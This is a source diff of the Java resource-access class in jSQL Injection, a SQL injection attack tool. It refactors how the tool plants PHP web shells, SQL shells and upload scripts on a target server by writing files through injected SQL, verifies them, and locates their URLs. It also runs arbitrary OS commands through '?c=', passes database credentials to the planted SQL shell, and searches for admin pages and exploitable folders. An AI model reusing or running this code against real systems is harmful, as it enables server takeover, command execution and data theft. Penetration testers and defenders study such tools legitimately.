@@ -11,35 +11,37 @@
 package com.jsql.model.accessible;
 
 import com.jsql.model.InjectionModel;
-import com.jsql.model.bean.database.AbstractElementDatabase;
+import com.jsql.model.bean.database.MockElement;
 import com.jsql.model.bean.util.Header;
 import com.jsql.model.bean.util.Interaction;
 import com.jsql.model.bean.util.Request;
 import com.jsql.model.exception.JSqlException;
+import com.jsql.model.exception.JSqlRuntimeException;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.ConnectionUtil;
 import com.jsql.util.LogLevelUtil;
 import com.jsql.util.StringUtil;
+import org.apache.commons.lang3.RandomStringUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.net.URI;
 import java.net.URLEncoder;
+import java.net.http.HttpHeaders;
 import java.net.http.HttpRequest;
 import java.net.http.HttpRequest.BodyPublishers;
 import java.net.http.HttpResponse;
 import java.net.http.HttpResponse.BodyHandlers;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.time.Duration;
 import java.util.*;
 import java.util.concurrent.*;
+import java.util.function.BiConsumer;
 import java.util.function.BiFunction;
 import java.util.regex.Pattern;
 
@@ -54,21 +56,6 @@ public class ResourceAccess {
      */
     private static final Logger LOGGER = LogManager.getRootLogger();
 
-    /**
-     * File name for web shell.
-     */
-    public final String filenameWebshell;
-    
-    /**
-     * File name for sql shell.
-     */
-    public final String filenameSqlshell;
-    
-    /**
-     * File name for upload form.
-     */
-    public final String filenameUpload;
-    
     /**
      * True if admin page should stop, false otherwise.
      */
@@ -89,16 +76,10 @@ public class ResourceAccess {
      * List of ongoing jobs.
      */
     private final List<CallableFile> callablesReadFile = new ArrayList<>();
-
-    private static final String MSG_EMPTY_PAYLOAD = "payload integrity check: empty payload";
-
     private final InjectionModel injectionModel;
 
     public ResourceAccess(InjectionModel injectionModel) {
         this.injectionModel = injectionModel;
-        this.filenameWebshell = "." + this.injectionModel.getPropertiesUtil().getVersionJsql() + ".jw.php";
-        this.filenameSqlshell = "." + this.injectionModel.getPropertiesUtil().getVersionJsql() + ".js.php";
-        this.filenameUpload = "." + this.injectionModel.getPropertiesUtil().getVersionJsql() + ".ju.php";
     }
 
     /**
@@ -117,7 +98,6 @@ public class ResourceAccess {
         if (urlWithoutProtocol.isEmpty() || !Pattern.matches("^/.*", urlWithoutProtocol)) {
             urlWithoutProtocol = "/dummy";
         }
-
         String[] splits = urlWithoutProtocol.split("/", -1);
         String[] folderNames = Arrays.copyOf(splits, splits.length - 1);
         for (String folderName: folderNames) {
@@ -153,12 +133,8 @@ public class ResourceAccess {
         }
 
         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
-        this.setSearchAdminStopped(false);
+        this.isSearchAdminStopped = false;
         this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);
-
-        var request = new Request();
-        request.setMessage(Interaction.END_ADMIN_SEARCH);
-        this.injectionModel.sendToViews(request);
 
         return nbAdminPagesFound;
     }
@@ -188,12 +164,11 @@ public class ResourceAccess {
 
     public void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
         var result = String.format(
-            "Found %s admin page%s%s on %s page%s",
-            nbAdminPagesFound,
-            nbAdminPagesFound > 1 ? 's' : StringUtils.EMPTY,
-            tasksHandled != submittedTasks ? " of "+ tasksHandled +" processed" : StringUtils.EMPTY,
+            "Searched %s/%s page%s: %s found",
+            tasksHandled,
             submittedTasks,
-            submittedTasks > 1 ? 's' : StringUtils.EMPTY
+            tasksHandled > 1 ? 's' : StringUtils.EMPTY,
+            nbAdminPagesFound
         );
         
         if (nbAdminPagesFound > 0) {
@@ -203,133 +178,180 @@ public class ResourceAccess {
         }
     }
 
-    public void createWebShell(String pathShell, String urlShell) throws JSqlException {
-        BiFunction<String, String, Request> biFunctionGetRequest = (String pathShellFixed, String urlSuccess) -> {
+    public String createExploitWeb(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod) throws JSqlException {
+        BiConsumer<String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             var request = new Request();
-            request.setMessage(Interaction.CREATE_SHELL_TAB);
-            request.setParameters(
-                pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY),
-                urlSuccess
-            );
-            return request;
+            request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
+            request.setParameters(urlSuccess);
+            this.injectionModel.sendToViews(request);
         };
-        createShell(pathShell, urlShell, "shell.web", this.filenameWebshell, biFunctionGetRequest);
+        return this.createExploit(pathExploit, urlExploit, "exploit.web", "web.php", biFuncGetRequest, pathNetshare, exploitMethod);
     }
 
-    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException {
-        BiFunction<String, String, Request> biFunctionGetRequest = (String pathShellFixed, String urlSuccess) -> {
-            var request = new Request();
-            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
-            request.setParameters(
-                pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY),
-                urlSuccess,
-                username,
-                password
-            );
-            return request;
+    public void createExploitUpload(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, File fileToUpload) throws JSqlException {
+        BiConsumer<String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
+                HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
+                if (result.body().contains(DataAccess.LEAD + "y")) {
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
+                } else {
+                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
+                }
+            } catch (IOException | JSqlException | InterruptedException e) {
+                throw new JSqlRuntimeException(e);
+            }
         };
-        createShell(pathShell, urlShell, "shell.sql", this.filenameSqlshell, biFunctionGetRequest);
+        this.createExploit(pathExploit, urlExploit, "exploit.upl", "upl.php", biFuncGetRequest, pathNetshare, exploitMethod);
+    }
+
+    public String createExploitSql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, String username, String password) throws JSqlException {
+        BiConsumer<String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            var request = new Request();
+            request.setMessage(Interaction.ADD_TAB_EXPLOIT_SQL);
+            request.setParameters(urlSuccess, username, password);
+            this.injectionModel.sendToViews(request);
+        };
+        // todo PDO
+        var nameExploitValidated = this.createExploit(pathExploit, urlExploit, "exploit.sql.php7", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
+        if (StringUtils.isEmpty(nameExploitValidated)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit failure with php7, retrying with lower version...");
+            nameExploitValidated = this.createExploit(pathExploit, urlExploit, "exploit.sql", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
+        }
+        return nameExploitValidated;
     }
 
     /**
      * Create shell on remote server
-     * @param pathShell Script to create on the server
-     * @param urlShell URL for the script (used for url rewriting)
+     * @param urlExploit  URL for the script (used for url rewriting)
      */
-    public void createShell(
-        String pathShell,
-        String urlShell,
-        String keyPropertyShell,
-        String filename,
-        BiFunction<String, String, Request> biFunctionGetRequest
+    public String createExploit(
+        String pathRemoteFolder,
+        String urlExploit,
+        String keyPropertyExploit,
+        String nameExploit,
+        BiConsumer<String, String> biFuncGetRequest,
+        String pathNetshareFolder,
+        ExploitMethod exploitMethod
     ) throws JSqlException {
         if (this.isReadingNotAllowed()) {
-            return;
+            return null;
         }
 
-        String bodyShell = StringUtil.base64Decode(
-            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(keyPropertyShell)
+        String bodyExploit = StringUtil.base64Decode(
+            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(keyPropertyExploit)
         )
         .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
         .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
-        String pathShellFixed = pathShell;
-        if (!pathShellFixed.matches(".*/$")) {
-            pathShellFixed += "/";
-        }
-
-        this.injectionModel.injectWithoutIndex(
-            this.injectionModel
-            .getMediatorVendor()
-            .getVendor()
-            .instance()
-            .sqlTextIntoFile(bodyShell, pathShellFixed + filename),
-            "shell:create"
-        );
-
-        String resultInjection;
-        var sourcePage = new String[]{ StringUtils.EMPTY };
-        try {
-            resultInjection = new SuspendableGetRows(this.injectionModel).run(
-                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + filename),
-                sourcePage,
-                false,
-                1,
-                AbstractElementDatabase.MOCK,
-                "shell:read"
-            );
-
-            if (StringUtils.isEmpty(resultInjection)) {
-                throw new JSqlException(MSG_EMPTY_PAYLOAD);
+        // outfile + binary: content corruption
+        BiFunction<String, String, Boolean> funcConfirm = (String pathFolder, String nameFile) -> {
+            try {
+                String resultInjection = this.confirmExploit(pathFolder + nameFile);
+                return resultInjection.contains(bodyExploit);
+            } catch (JSqlException e) {
+                throw new JSqlRuntimeException(e);
             }
-        } catch (JSqlException e) {
-            throw new JSqlException("injected payload does not match source", e);
+        };
+
+        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;
+        String nameExploitValidated = StringUtils.EMPTY;
+
+        if (exploitMethod == ExploitMethod.NETSHARE) {
+            ResourceAccess.copyToShare(pathNetshareFolder + nameExploit, bodyExploit);
+            nameExploitValidated = this.injectionModel.getUdfAccess().byNetshare(
+                nbIndexesFound,
+                pathNetshareFolder,
+                nameExploit,
+                pathRemoteFolder,
+                funcConfirm
+            );
+        } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
+            nameExploitValidated = this.injectionModel.getUdfAccess().byQueryBody(
+                nbIndexesFound,
+                pathRemoteFolder,
+                nameExploit,
+                UdfAccess.toHexChunks(bodyExploit.getBytes()),
+                funcConfirm
+            );
+        }
+        if (StringUtils.isEmpty(nameExploitValidated) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
+            var nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
+            this.injectionModel.getUdfAccess().byTable(
+                UdfAccess.toHexChunks(bodyExploit.getBytes()),
+                pathRemoteFolder + nameExploitRandom
+            );
+            if (funcConfirm.apply(pathRemoteFolder, nameExploitRandom)) {
+                nameExploitValidated = nameExploitRandom;
+            }
         }
 
-        String urlShellFixed = urlShell;
-        if (!urlShellFixed.isEmpty()) {
-            urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
+        if (StringUtils.isEmpty(nameExploitValidated)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit creation failure: source file not found at [{}]", pathRemoteFolder + nameExploitValidated);
+            return null;
         }
+        nameExploit = nameExploitValidated;
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit creation successful: source file found at [{}]", pathRemoteFolder + nameExploitValidated);
 
-        String url = urlShellFixed;
+        this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
+        return nameExploitValidated;
+    }
+
+    private void checkUrls(String urlExploit, String nameExploit, BiConsumer<String, String> biFuncGetRequest) {
+        String urlExploitFixed = urlExploit;
+        if (!urlExploitFixed.isEmpty()) {
+            urlExploitFixed = urlExploitFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
+        }
+        String url = urlExploitFixed;
         if (StringUtils.isEmpty(url)) {
             url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
         }
-        if (!resultInjection.contains(bodyShell)) {
-            throw this.getIntegrityError(sourcePage);
-        }
-
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Payload created into '{}{}'", pathShellFixed, filename);
         String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
         String urlProtocol;
-
         if ("/".equals(urlWithoutProtocol)) {
             urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
         } else {
             urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
         }
 
-        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
-
         List<String> directoryNames = new ArrayList<>();
+        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
         if (urlWithoutFileName.split("/").length == 0) {
             directoryNames.add("/");
         }
         for (String directoryName: urlWithoutFileName.split("/")) {
             directoryNames.add(directoryName +"/");
         }
-
-        String urlSuccess = getShellUrl(filename, directoryNames, urlProtocol);
+        String urlSuccess = this.getExploitUrl(nameExploit, directoryNames, urlProtocol);
         if (urlSuccess != null) {
-            var request = biFunctionGetRequest.apply(filename, urlSuccess);
-            this.injectionModel.sendToViews(request);
+            biFuncGetRequest.accept(nameExploit, urlSuccess);
         } else {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Payload not found");
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: URL not found");
         }
     }
 
-    private String getShellUrl(String filename, List<String> directoryNames, String urlProtocol) {
-        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCreateShell");
+    private static void copyToShare(String pathFile, String bodyExploit) throws JSqlException {
+        Path path = Paths.get(pathFile);
+        try {
+            Files.write(path, bodyExploit.getBytes());
+        } catch (IOException e) {
+            throw new JSqlException(e);
+        }
+    }
+
+    private String confirmExploit(String path) throws JSqlException {
+        var sourcePage = new String[]{ StringUtils.EMPTY };
+        return new SuspendableGetRows(this.injectionModel).run(
+            this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(path),
+            sourcePage,
+            false,
+            1,
+            MockElement.MOCK,
+            "xpl#confirm-file"
+        );
+    }
+
+    private String getExploitUrl(String filename, List<String> directoryNames, String urlProtocol) {
+        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetExploitUrl");
         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
         var urlPart = new StringBuilder();
 
@@ -339,22 +361,22 @@ public class ResourceAccess {
                 new CallableHttpHead(
                     urlProtocol + urlPart + filename,
                     this.injectionModel,
-                    "shell#confirm"
+                    "xpl#confirm-url"
                 )
             );
         }
 
-        int submittedTasks = directoryNames.size();
         String urlSuccess = null;
-
+        int submittedTasks = directoryNames.size();
         for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
             try {
                 CallableHttpHead currentCallable = taskCompletionService.take().get();
                 if (currentCallable.isHttpResponseOk()) {
                     urlSuccess = currentCallable.getUrl();
-                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Payload found: {}", urlSuccess);
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit access successful: connection done at [{}]", currentCallable.getUrl());
+                    break;
                 } else {
-                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Payload not found: {}", currentCallable.getUrl());
+                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Exploit access failure: connection not found at [{}]", currentCallable.getUrl());
                 }
             } catch (InterruptedException e) {
                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
@@ -384,9 +406,8 @@ public class ResourceAccess {
         try {
             result = regexSearch.group(1);
         } catch (IllegalStateException e) {
-            // Fix return null from regex
-            result = StringUtils.EMPTY;
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Incorrect response from Web shell");
+            result = StringUtils.EMPTY;  // fix return null from regex
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Command failure: incorrect response from shell");
         }
         return result;
     }
@@ -395,21 +416,19 @@ public class ResourceAccess {
      * Run a shell command on host.
      * @param command The command to execute
      * @param uuidShell An unique identifier for terminal
-     * @param urlShell Web path of the shell
+     * @param urlExploit Web path of the shell
      */
-    public String runWebShell(String command, UUID uuidShell, String urlShell) {
+    public String runWebShell(String command, UUID uuidShell, String urlExploit) {
         String result = this.runCommandShell(
-            urlShell + "?c="+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)
+            urlExploit + "?c="+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)
         );
-
         if (StringUtils.isBlank(result)) {
             // TODO Payload should redirect directly error to normal output
             result = "No result.\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
         }
 
-        // Unfroze interface
-        var request = new Request();
-        request.setMessage(Interaction.GET_WEB_SHELL_RESULT);
+        var request = new Request();  // Unfroze interface
+        request.setMessage(Interaction.GET_EXPLOIT_WEB_RESULT);
         request.setParameters(uuidShell, result);
         this.injectionModel.sendToViews(request);
         return result;
@@ -419,37 +438,35 @@ public class ResourceAccess {
      * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
      * @param command SQL request to execute
      * @param uuidShell Identifier of terminal sending the request
-     * @param urlShell URL to send SQL request against
+     * @param urlExploit URL to send SQL request against
      * @param username Username [optional]
      * @param password password [optional]
      */
-    public String runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
-        String result = this.runCommandShell(
-            String.format(
-                 "%s?q=%s&u=%s&p=%s",
-                 urlShell,
-                 URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),
-                 username,
-                 password
-            )
-        );
+    public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password) {
+        String result = this.runCommandShell(String.format(
+             "%s?q=%s&u=%s&p=%s",
+             urlExploit,
+             URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),
+             username,
+             password
+        ));
             
         if (result.contains("<SQLr>")) {
             List<List<String>> listRows = this.parse(result);
             if (listRows.isEmpty()) {
-                return StringUtils.EMPTY;
+                result = "Result not found: check your credentials or review logs in tab Network\n";
+            } else {
+                List<Integer> listFieldsLength = this.parseColumnLength(listRows);
+                result = this.convert(listRows, listFieldsLength);
             }
-            List<Integer> listFieldsLength = this.parseColumnLength(listRows);
-            result = this.convert(listRows, listFieldsLength);
-        } else if (result.contains("<SQLm>")) {
+        } else if (result.contains("<SQLm>")) {  // todo deprecated
             result = result.replace("<SQLm>", StringUtils.EMPTY) + "\n";
-        } else if (result.contains("<SQLe>")) {
+        } else if (result.contains("<SQLe>")) {  // todo deprecated
             result = result.replace("<SQLe>", StringUtils.EMPTY) + "\n";
         }
 
-        // Unfroze interface
-        var request = new Request();
-        request.setMessage(Interaction.GET_SQL_SHELL_RESULT);
+        var request = new Request();  // Unfroze interface
+        request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
         request.setParameters(uuidShell, result, command);
         this.injectionModel.sendToViews(request);
         return result;
@@ -514,96 +531,7 @@ public class ResourceAccess {
         return listRows;
     }
 
-    /**
-     * Upload a file to the server.
-     * @param pathFile Remote path of the file to upload
-     * @param urlFile URL of uploaded file
-     * @param file File to upload
-     */
-    public void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException, InterruptedException {
-        if (this.isReadingNotAllowed()) {
-            return;
-        }
-        
-        String bodyShell = StringUtil.base64Decode(
-            this.injectionModel.getMediatorUtils()
-            .getPropertiesUtil()
-            .getProperties()
-            .getProperty("shell.upload")
-        )
-        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);
-        
-        String pathShellFixed = pathFile;
-        if (!pathShellFixed.matches(".*/$")) {
-            pathShellFixed += "/";
-        }
-        this.injectionModel.injectWithoutIndex(
-            this.injectionModel.getMediatorVendor()
-            .getVendor()
-            .instance()
-            .sqlTextIntoFile(
-                "<"+ DataAccess.LEAD +">"+ bodyShell +"<"+ DataAccess.TRAIL +">",
-                pathShellFixed + this.filenameUpload
-            ),
-            "upload"
-        );
-
-        var sourcePage = new String[]{ StringUtils.EMPTY };
-        String bodyShellInjected;
-        try {
-            bodyShellInjected = new SuspendableGetRows(this.injectionModel).run(
-                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),
-                sourcePage,
-                false,
-                1,
-                AbstractElementDatabase.MOCK,
-                "upload"
-            );
-            
-            if (StringUtils.isEmpty(bodyShellInjected)) {
-                throw new JSqlException(MSG_EMPTY_PAYLOAD);
-            }
-        } catch (JSqlException e) {
-            throw this.getIntegrityError(sourcePage);
-        }
-
-        String urlFileFixed = urlFile;
-        if (StringUtils.isEmpty(urlFileFixed)) {
-            urlFileFixed = this.injectionModel.getMediatorUtils()
-                .getConnectionUtil()
-                .getUrlBase()
-                .substring(
-                    0,
-                    this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1
-                );
-        }
-        
-        if (bodyShellInjected.contains(bodyShell)) {
-            String logUrlFileFixed = urlFileFixed;
-            String logPathShellFixed = pathShellFixed;
-            LOGGER.log(
-                LogLevelUtil.CONSOLE_SUCCESS,
-                "Upload payload deployed at '{}{}' in '{}{}'",
-                () -> logUrlFileFixed,
-                () -> this.filenameUpload,
-                () -> logPathShellFixed,
-                () -> this.filenameUpload
-            );
-            
-            try (InputStream streamToUpload = new FileInputStream(file)) {
-                HttpResponse<String> result = this.upload(file, urlFileFixed +"/"+ this.filenameUpload, streamToUpload);
-                this.confirmUpload(file, pathShellFixed, urlFileFixed, result);
-            }
-        } else {
-            throw this.getIntegrityError(sourcePage);
-        }
-        
-        var request = new Request();
-        request.setMessage(Interaction.END_UPLOAD);
-        this.injectionModel.sendToViews(request);
-    }
-
-    private HttpResponse<String> upload(File file, String string, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
+    private HttpResponse<String> upload(File file, String url, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
         var crLf = "\r\n";
         var boundary = "---------------------------4664151417711";
         
@@ -622,53 +550,33 @@ public class ResourceAccess {
         headerFile += crLf +"--"+ boundary +"--"+ crLf;
 
         var httpRequest = HttpRequest.newBuilder()
-            .uri(URI.create(string))
+            .uri(URI.create(url))
             .timeout(Duration.ofSeconds(15))
-            .POST(
-                BodyPublishers.ofByteArrays(
-                    Arrays.asList(
-                        headerForm.getBytes(StandardCharsets.UTF_8),
-                        Files.readAllBytes(Paths.get(file.toURI())),
-                        headerFile.getBytes(StandardCharsets.UTF_8)
-                    )
+            .POST(BodyPublishers.ofByteArrays(
+                Arrays.asList(
+                    headerForm.getBytes(StandardCharsets.UTF_8),
+                    Files.readAllBytes(Paths.get(file.toURI())),
+                    headerFile.getBytes(StandardCharsets.UTF_8)
                 )
-            )
+            ))
             .setHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
             .build();
-            
-        return this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().send(httpRequest, BodyHandlers.ofString());
-    }
 
-    private void confirmUpload(File file, String pathShellFixed, String urlFileFixed, HttpResponse<String> httpResponse) {
-        if (httpResponse.body().contains(DataAccess.LEAD + "y")) {
-            LOGGER.log(
-                LogLevelUtil.CONSOLE_SUCCESS,
-                "File '{}' uploaded into '{}'",
-                file::getName,
-                () -> pathShellFixed
-            );
-        } else {
-            LOGGER.log(
-                LogLevelUtil.CONSOLE_ERROR,
-                "Upload file '{}' into '{}' failed",
-                file::getName,
-                () -> pathShellFixed
-            );
-        }
-        
-        Map<String, String> headers = ConnectionUtil.getHeadersMap(httpResponse);
-            
+        var response = this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().send(httpRequest, BodyHandlers.ofString());
+        HttpHeaders httpHeaders = response.headers();
+        String pageSource = response.body();
+
         Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
-        msgHeader.put(Header.URL, urlFileFixed);
-        msgHeader.put(Header.POST, StringUtils.EMPTY);
-        msgHeader.put(Header.HEADER, StringUtils.EMPTY);
-        msgHeader.put(Header.RESPONSE, headers);
-        msgHeader.put(Header.SOURCE, httpResponse.toString());
-   
+        msgHeader.put(Header.URL, url);
+        msgHeader.put(Header.HEADER, ConnectionUtil.getHeadersMap(httpRequest.headers()));
+        msgHeader.put(Header.RESPONSE, ConnectionUtil.getHeadersMap(httpHeaders));
+        msgHeader.put(Header.SOURCE, pageSource);
+        msgHeader.put(Header.METADATA_PROCESS, "upl#multipart");
         var request = new Request();
         request.setMessage(Interaction.MESSAGE_HEADER);
         request.setParameters(msgHeader);
         this.injectionModel.sendToViews(request);
+        return response;
     }
     
     /**
@@ -680,7 +588,6 @@ public class ResourceAccess {
         // Unsupported Reading file when <file> is not present in current xmlModel
         // Fix #41055: NullPointerException on getFile()
         if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {
-            
             LOGGER.log(
                 LogLevelUtil.CONSOLE_ERROR,
                 "Reading file on {} is currently not supported",
@@ -695,7 +602,7 @@ public class ResourceAccess {
             sourcePage,
             false,
             1,
-            AbstractElementDatabase.MOCK,
+            MockElement.MOCK,
             "privilege"
         );
 
@@ -747,7 +654,7 @@ public class ResourceAccess {
         for (String pathFile: pathsFiles) {
             var callableFile = new CallableFile(pathFile, this.injectionModel);
             taskCompletionService.submit(callableFile);
-            this.getCallablesReadFile().add(callableFile);
+            this.callablesReadFile.add(callableFile);
         }
 
         List<String> duplicate = new ArrayList<>();
@@ -756,13 +663,14 @@ public class ResourceAccess {
 
         for (
             tasksHandled = 0
-            ; tasksHandled < submittedTasks && !this.isSearchFileStopped()
+            ; tasksHandled < submittedTasks && !this.isSearchFileStopped
             ; tasksHandled++
         ) {
             var currentCallable = taskCompletionService.take().get();
             if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {
-                var name = currentCallable.getPathFile()
-                    .substring(currentCallable.getPathFile().lastIndexOf('/') + 1);
+                var name = currentCallable.getPathFile().substring(
+                    currentCallable.getPathFile().lastIndexOf('/') + 1
+                );
                 String content = currentCallable.getSourceFile();
                 String path = currentCallable.getPathFile();
 
@@ -774,7 +682,7 @@ public class ResourceAccess {
                 if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {
                     LOGGER.log(
                         LogLevelUtil.CONSOLE_INFORM,
-                        "Shell might be possible in folder {}",
+                        "Folder candidate to exploit: {}",
                         () -> path.replace(name, StringUtils.EMPTY)
                     );
                 }
@@ -787,20 +695,19 @@ public class ResourceAccess {
         }
 
         // Force ongoing suspendables to stop immediately
-        for (CallableFile callableReadFile: this.getCallablesReadFile()) {
+        for (CallableFile callableReadFile: this.callablesReadFile) {
             callableReadFile.getSuspendableReadFile().stop();
         }
-
-        this.getCallablesReadFile().clear();
+        this.callablesReadFile.clear();
         this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
-        this.setSearchFileStopped(false);
+        this.isSearchFileStopped = false;
 
         var result = String.format(
-            "Found %s file%s%s on %s files checked",
-            countFileFound,
-            countFileFound > 1 ? 's' : StringUtils.EMPTY,
-            tasksHandled != submittedTasks ? " of "+ tasksHandled +" processed " : StringUtils.EMPTY,
-            submittedTasks
+            "Searched %s/%s file%s: %s found",
+            tasksHandled,
+            submittedTasks,
+            tasksHandled > 1 ? 's' : StringUtils.EMPTY,
+            countFileFound
         );
 
         if (countFileFound > 0) {
@@ -808,10 +715,6 @@ public class ResourceAccess {
         } else {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
         }
-
-        var request = new Request();
-        request.setMessage(Interaction.END_FILE_SEARCH);
-        this.injectionModel.sendToViews(request);
 
         return results;
     }
@@ -821,27 +724,22 @@ public class ResourceAccess {
      * Any ongoing file reading is interrupted and any new file read
      * is cancelled.
      */
-    public void stopSearchingFile() {
-        this.setSearchFileStopped(true);
-        // Force ongoing suspendable to stop immediately
-        for (CallableFile callable: this.getCallablesReadFile()) {
-            callable.getSuspendableReadFile().stop();
+    public void stopSearchFile() {
+        this.isSearchFileStopped = true;
+        for (CallableFile callable: this.callablesReadFile) {
+            callable.getSuspendableReadFile().stop();  // force ongoing business to stop immediately
         }
     }
-    
-    private JSqlException getIntegrityError(String[] sourcePage) {
-        return new JSqlException("Payload integrity check failure: "+ sourcePage[0].trim().replace("\\n", "\\\\\\n"));
+
+    public void stopSearchAdmin() {
+        this.isSearchAdminStopped = true;
     }
-    
-    
+
+
     // Getters and setters
     
     public boolean isSearchAdminStopped() {
         return this.isSearchAdminStopped;
-    }
-
-    public void setSearchAdminStopped(boolean isSearchAdminStopped) {
-        this.isSearchAdminStopped = isSearchAdminStopped;
     }
     
     public void setScanStopped(boolean isScanStopped) {
@@ -850,17 +748,5 @@ public class ResourceAccess {
 
     public boolean isScanStopped() {
         return this.isScanStopped;
-    }
-
-    public boolean isSearchFileStopped() {
-        return this.isSearchFileStopped;
-    }
-
-    public void setSearchFileStopped(boolean isSearchFileStopped) {
-        this.isSearchFileStopped = isSearchFileStopped;
-    }
-
-    public List<CallableFile> getCallablesReadFile() {
-        return this.callablesReadFile;
     }
 }
